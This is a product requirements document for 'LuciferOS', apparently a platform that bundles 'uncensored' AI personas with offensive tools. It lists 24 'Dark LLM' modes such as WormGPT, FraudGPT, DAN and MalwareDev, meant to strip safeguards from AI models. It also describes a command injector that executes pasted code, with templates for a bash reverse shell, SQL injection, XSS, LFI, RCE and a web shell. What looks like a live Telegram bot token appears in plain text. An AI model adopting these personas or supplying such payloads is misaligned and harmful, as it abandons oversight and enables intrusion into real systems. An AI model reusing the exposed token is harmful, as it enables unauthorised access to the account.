# LuciferOS - Product Requirements Document v5.1

## Original Problem Statement
Build a comprehensive red-teaming platform with uncensored AI, offensive tools, and command injection capabilities.

## Current Status: v5.1 - Services Fixed & Fully Operational ✅

### Latest Update (Feb 10, 2026)
- **P0 Bug Fixed:** Dashboard and backend services now running via supervisor
- **All Systems Online:** Backend ✓, OpenClaw ✓, AI Providers 4/4 ✓
- **Testing Passed:** 100% backend tests, 100% frontend UI tests

### Services Configuration
| Service | Port | Status | Command |
|---------|------|--------|---------|
| FastAPI Proxy | 8001 | ✅ Running | `uvicorn server:app` |
| Dashboard (Flask) | 3000 | ✅ Running | `python3 web_dashboard_master.py` |
| LILITH Backend | 5000 | ✅ Running | `python3 lilith_full_backend.py` |
| Telegram Bot | - | ⚠️ Conflict | Token in use elsewhere |
| MongoDB | 27017 | ✅ Running | `mongod` |

### Features Implemented
- **⚡ COMMAND INJECTOR** - Paste and execute scripts/commands directly
- **🖤 LILITH AI** - Seductive succubus hacker persona with g4f providers
- **24 Dark LLM Personas** - All modes selectable
- **🔧 Offensive Tools** - Nmap, SQLMap, Hydra, Dirb integrated
- **🔄 Proxy Rotation** - Integrated into all tools
- **💾 Memory System** - SQLite-based conversation persistence
- **👨‍💻 Coding Agent** - Available with LILITH fallback

### Command Injector Templates
| Template | Description |
|----------|-------------|
| 🐚 RevShell | `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` |
| 💉 SQLi | `' OR '1'='1' --` |
| 📜 XSS | `alert('XSS')` |
| 📁 LFI | `../../../etc/passwd` |
| 💀 RCE | `; id` |
| 🕸️ WebShell | `system(cmd);` |
| ⬆️ PrivEsc | `sudo -l` |
| 🔍 Enum | `whoami && id` |

### 24 Dark LLM Modes
LILITH, WormGPT, FraudGPT, DarkGemini, HackerGPT, DAN, WolfGPT, DarkBARD, EvilGPT, GhostGPT, ChaosAI, EscapeAI, CodeBreaker, SocialEngineer, ZeroDay, RedTeam, DevilGPT, BlackHatAI, PentestGPT, MalwareDev, WebExploit, OSINTMaster, IoTAttack, CloudPwn

### API Endpoints
| Endpoint | Method | Description |
|----------|--------|-------------|
| `/_dash/ai/chat` | POST | Send message to LILITH |
| `/_dash/ai/status` | GET | Get AI provider status |
| `/_dash/ai/set-mode` | POST | Change Dark LLM mode |
| `/_dash/backend/status` | GET | Backend health check |
| `/_dash/injector/execute` | POST | Execute code |
| `/_dash/injector/test` | POST | Test syntax |
| `/_dash/coding/status` | GET | Coding agent status |

### Telegram Bot
- Token: `8329009190:AAFTUX4D0id7oVPEOqr9wy0r1HpJ9Up_2bw`
- Status: ⚠️ Conflict - Only one bot instance can poll at a time
- Note: If you have this bot running elsewhere, stop it first

### Dashboard URL
https://luciferos-hack.preview.emergentagent.com

## Architecture
```
/app/
├── backend/
│   └── server.py             # FastAPI proxy (port 8001)
├── tools/
│   ├── lilith_full_backend.py # Core Flask backend (port 5000)
│   ├── lilith_ai_engine.py   # 24 Dark LLM modes + g4f
│   ├── lilith_memory.py      # SQLite persistence
│   ├── proxy_rotator.py      # Proxy rotation
│   ├── offensive_tools.py    # Proxy-aware tools
│   └── shrek_payloads.py     # Payload generator
├── ui/
│   └── web_dashboard_master.py  # Flask dashboard (port 3000)
├── telegram_lilith_bot.py    # Telegram bot
└── config/
    └── lilith_memory.db      # SQLite database
```

## Supervisor Services
Services configured in `/etc/supervisor/conf.d/apps.conf`:
- `backend` - FastAPI proxy
- `dashboard` - Flask web UI
- `lilith_backend` - Core backend
- `telegram_bot` - Telegram interface
- `mongodb` - Database

## Test Results (Feb 10, 2026)
| Category | Result |
|----------|--------|
| Backend Tests | 100% (12/12 passed) |
| Frontend Tests | 100% (All UI renders) |
| AI Chat | ✅ Working (g4f:auto) |
| Command Injector | ✅ Execute & Test |
| Status APIs | ✅ All responsive |

## Known Issues
1. **Telegram Bot Conflict** - Only one polling instance allowed per token
2. **AI Provider Latency** - g4f can timeout on slow providers
3. **DIG AI** - Requires SOCKS proxy (falls back to g4f)

## Backlog
- [ ] Stop conflicting Telegram bot instance externally
- [ ] SQLMap extensive testing against vulnerable target
- [ ] Integrate Shrek Payload Generator into UI
- [ ] Implement Attack Chains (one-click sequences)
- [ ] Refactor monolithic files
- [ ] Mobile responsive UI
